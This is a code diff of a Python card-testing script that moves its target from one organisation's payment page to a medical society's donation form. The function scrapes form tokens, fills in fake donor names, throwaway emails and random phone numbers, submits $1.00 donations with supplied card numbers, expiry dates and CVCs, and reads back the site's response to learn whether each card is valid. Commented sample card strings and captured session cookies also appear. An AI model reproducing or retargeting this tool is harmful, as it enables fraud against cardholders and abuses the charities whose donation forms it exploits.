@@ -62,11 +62,10 @@ def Tele(ccx):
     lr = random.randint(1000, 9999)
     
     headers = {
-        'authority': 'www.bethpark.org',
+        'authority': 'clarkcountymedical.org',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
         'cache-control': 'max-age=0',
-        #'if-modified-since': 'Tue, 28 Dec 2021 09:41:13 GMT',
         'referer': 'https://www.google.com/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
@@ -76,41 +75,37 @@ def Tele(ccx):
         'sec-fetch-site': 'cross-site',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'user-agent': user,
     }
     
-    response = session.get('https://www.bethpark.org/other-payment/', headers=headers)
+    response = session.get('https://clarkcountymedical.org/donation/', headers=headers)
     
     ajax = re.search(r"&amp;hash=(.*?)'", response.text).group(1)
     currency = re.search(r"data-currency='USD' value='(.*?)'", response.text).group(1)
-    state = re.search(r"name='state_1' value='(.*?)'", response.text).group(1)
+    state = re.search(r"name='state_13' value='(.*?)'", response.text).group(1)
     version = re.search(r'"version_hash":"(.*?)"', response.text).group(1)
-    #print(ajax)
+    #print(version)
     
     cookies = {
-        '_ga_S01GCQ9W83': 'GS2.1.s1777421530$o1$g0$t1777421530$j60$l0$h0',
-        '_ga': 'GA1.2.521965049.1777421531',
-        '_gid': 'GA1.2.1042330939.1777421531',
-        'wcsid': '0Hdy7nrRUtkTcgqH6S7Lx0I0dborzA5a',
-        'hblid': 'w7bzhsGG8rs3uWLk6S7Lx0I0Aaz05drb',
-        'cf_clearance': '0OsJydBMGQTadQoYqroYqJ3RyRTLDPgc6UcXnoNj7Fk-1777421532-1.2.1.1-tq6mIV35w3hp.GLLDrDiWCDcwrDOOo4lULpaUiWWcRrkqi6G9wWcyyBYKnNBET9o_ittJNOLOhyOQpYOhhnhI4yarCMEdQyKS.Mpn8JpyjdD2J35ZFdnWj7u0pIoXbUf8ZqD2Aoehrc5EXP1ZNJtoGfVrfwUpBv0BZQPQ6cf3o5wN_fY8z.dro09Op9vEJQjROdp.Aa1J9qIfcjaM__Hz5UiDA2HcbCiaRb9.IkM8F3IV7hTZG3EYiSPcuBIrQvU3Qe2wbsurIDIdoijLLQLz4sbO_Yx79O9hGvtARQT3UQuyKoFGesYkfHbUe_ZMUx__xFwSAbE1f0CrsDTgsb0PA',
-        '__cf_bm': 'uJKLK51mPJeTqGsbtQtRBGyfvvU8lxs_3JBVQ7TU.n0-1777421532.296741-1.0.1.1-Q54Ai4TkCYTFpcHqd1F93IYn2z80c8GqnFBisoDujPNr4w2OyzHwd499uYi_HlYASopSnQM03TKUqB0gdOcRNPKN885qmJscRYDDzwrL.NaksjJqF4yPL8BSPJgTJdwc',
-        '_okdetect': '%7B%22token%22%3A%2217774215317640%22%2C%22proto%22%3A%22about%3A%22%2C%22host%22%3A%22%22%7D',
-        'olfsk': 'olfsk23099488512443234',
-        '_okbk': 'cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1777421532176%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C',
-        '_ok': '3825-592-10-7286',
-        '_oklv': '1777421591402%2C0Hdy7nrRUtkTcgqH6S7Lx0I0dborzA5a',
+        'swpm_session': 'c4502071f520e52a3620d8e70b445149',
+        'sbjs_migrations': '1418474375998%3D1',
+        'sbjs_current_add': 'fd%3D2026-05-01%2006%3A17%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fclarkcountymedical.org%2Fdonation%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+        'sbjs_first_add': 'fd%3D2026-05-01%2006%3A17%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fclarkcountymedical.org%2Fdonation%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
+        'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
+        'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fclarkcountymedical.org%2Fdonation%2F',
     }
     
     headers = {
-        'authority': 'www.bethpark.org',
+        'authority': 'clarkcountymedical.org',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
         'cache-control': 'max-age=0',
-        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundary9znuuEWrFNbdagNn',
-        # 'cookie': '_ga_S01GCQ9W83=GS2.1.s1777421530$o1$g0$t1777421530$j60$l0$h0; _ga=GA1.2.521965049.1777421531; _gid=GA1.2.1042330939.1777421531; wcsid=0Hdy7nrRUtkTcgqH6S7Lx0I0dborzA5a; hblid=w7bzhsGG8rs3uWLk6S7Lx0I0Aaz05drb; cf_clearance=0OsJydBMGQTadQoYqroYqJ3RyRTLDPgc6UcXnoNj7Fk-1777421532-1.2.1.1-tq6mIV35w3hp.GLLDrDiWCDcwrDOOo4lULpaUiWWcRrkqi6G9wWcyyBYKnNBET9o_ittJNOLOhyOQpYOhhnhI4yarCMEdQyKS.Mpn8JpyjdD2J35ZFdnWj7u0pIoXbUf8ZqD2Aoehrc5EXP1ZNJtoGfVrfwUpBv0BZQPQ6cf3o5wN_fY8z.dro09Op9vEJQjROdp.Aa1J9qIfcjaM__Hz5UiDA2HcbCiaRb9.IkM8F3IV7hTZG3EYiSPcuBIrQvU3Qe2wbsurIDIdoijLLQLz4sbO_Yx79O9hGvtARQT3UQuyKoFGesYkfHbUe_ZMUx__xFwSAbE1f0CrsDTgsb0PA; __cf_bm=uJKLK51mPJeTqGsbtQtRBGyfvvU8lxs_3JBVQ7TU.n0-1777421532.296741-1.0.1.1-Q54Ai4TkCYTFpcHqd1F93IYn2z80c8GqnFBisoDujPNr4w2OyzHwd499uYi_HlYASopSnQM03TKUqB0gdOcRNPKN885qmJscRYDDzwrL.NaksjJqF4yPL8BSPJgTJdwc; _okdetect=%7B%22token%22%3A%2217774215317640%22%2C%22proto%22%3A%22about%3A%22%2C%22host%22%3A%22%22%7D; olfsk=olfsk23099488512443234; _okbk=cd4%3Dtrue%2Cvi5%3D0%2Cvi4%3D1777421532176%2Cvi3%3Dactive%2Cvi2%3Dfalse%2Cvi1%3Dfalse%2Ccd8%3Dchat%2Ccd6%3D0%2Ccd5%3Daway%2Ccd3%3Dfalse%2Ccd2%3D0%2Ccd1%3D0%2C; _ok=3825-592-10-7286; _oklv=1777421591402%2C0Hdy7nrRUtkTcgqH6S7Lx0I0dborzA5a',
-        'origin': 'https://www.bethpark.org',
-        'referer': 'https://www.bethpark.org/other-payment/',
+        #'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryAnO2kxesjqCrZyZ9',
+        # 'cookie': 'swpm_session=c4502071f520e52a3620d8e70b445149; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2026-05-01%2006%3A17%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fclarkcountymedical.org%2Fdonation%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_first_add=fd%3D2026-05-01%2006%3A17%3A45%7C%7C%7Cep%3Dhttps%3A%2F%2Fclarkcountymedical.org%2Fdonation%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F; sbjs_current=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fclarkcountymedical.org%2Fdonation%2F',
+        'origin': 'https://clarkcountymedical.org',
+        'referer': 'https://clarkcountymedical.org/donation/',
         'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
         'sec-ch-ua-mobile': '?1',
         'sec-ch-ua-platform': '"Android"',
@@ -119,48 +114,46 @@ def Tele(ccx):
         'sec-fetch-site': 'same-origin',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+        'user-agent': user,
     }
     
     files = [
-        ('input_11', (None, '')),
         ('input_1.3', (None, f'{first_name}')),
         ('input_1.6', (None, f'{last_name}')),
         ('input_2', (None, f'yellhtetgaung{nr}@gmail.com')),
-        ('input_3', (None, f'(430) 300-{lr}')),
-        ('input_4', (None, '')),
-        ('input_5', (None, '1')),
-        ('input_6', (None, '$1.00')),
-        ('input_7', (None, '$1.00')),
-        ('input_8.1', (None, f'{n}')),
-        ('input_8.2[]', (None, f'{mm}')),
-        ('input_8.2[]', (None, f'20{yy}')),
-        ('input_8.3', (None, f'{cvc}')),
-        ('input_8.5', (None, f'{first_name} {last_name}')),
-        ('gform_ajax', (None, f'form_id=1&title=&description=&tabindex=0&theme=gravity-theme&styles=[]&hash={ajax}')),
+        ('input_2_2', (None, f'yellhtetgaung{nr}@gmail.com')),
+        ('input_3', (None, 'Other amount|0')),
+        ('input_4', (None, '$1.00')),
+        ('input_5', (None, '$1.00')),
+        ('input_10.1', (None, f'{n}')),
+        ('input_10.2[]', (None, f'{mm}')),
+        ('input_10.2[]', (None, f'20{yy}')),
+        ('input_10.3', (None, f'{cvc}')),
+        ('input_10.5', (None, f'{first_name} {last_name}')),
+        ('gform_ajax', (None, f'form_id=13&title=1&description=1&tabindex=0&theme=gravity-theme&hash={ajax}')),
         ('gform_submission_method', (None, 'iframe')),
         ('gform_theme', (None, 'gravity-theme')),
-        ('gform_style_settings', (None, '[]')),
-        ('is_submit_1', (None, '1')),
-        ('gform_submit', (None, '1')),
+        ('gform_style_settings', (None, '')),
+        ('is_submit_13', (None, '1')),
+        ('gform_submit', (None, '13')),
         ('gform_currency', (None, f'{currency}')),
         ('gform_unique_id', (None, '')),
-        ('state_1', (None, f'{state}')),
-        ('gform_target_page_number_1', (None, '0')),
-        ('gform_source_page_number_1', (None, '1')),
+        ('state_13', (None, f'{state}')),
+        ('gform_target_page_number_13', (None, '0')),
+        ('gform_source_page_number_13', (None, '1')),
         ('gform_field_values', (None, '')),
         ('version_hash', (None, f'{version}')),
-        ('gform_submission_speeds', (None, '{"pages":{"1":[23340]}}')),
+        ('gform_submission_speeds', (None, '{"pages":{"1":[73892]}}')),
     ]
     
-    response = session.post('https://www.bethpark.org/other-payment/', #cookies=cookies, 
+    response = session.post('https://clarkcountymedical.org/donation/', #cookies=cookies, 
     headers=headers, files=files)
     
     try:
         result = re.search(r"class='gfield_description validation_message gfield_validation_message'><!-- (.*?)<\/div><\/fieldset>", response.text).group(1)
     except:
-        result = re.search(r"class='gform_confirmation_message_1 gform_confirmation_message'>(.*?)<\/div><\/div>", response.text).group(1)
+        result = re.search(r"class='gform_confirmation_message_13 gform_confirmation_message'>(.*?)<\/div><\/div>", response.text).group(1)
     return result
     
-#test_card = "5164998784300556|06|2029|155"
+#test_card = "4744722125678468|09|27|542"
 #print(Tele(test_card))
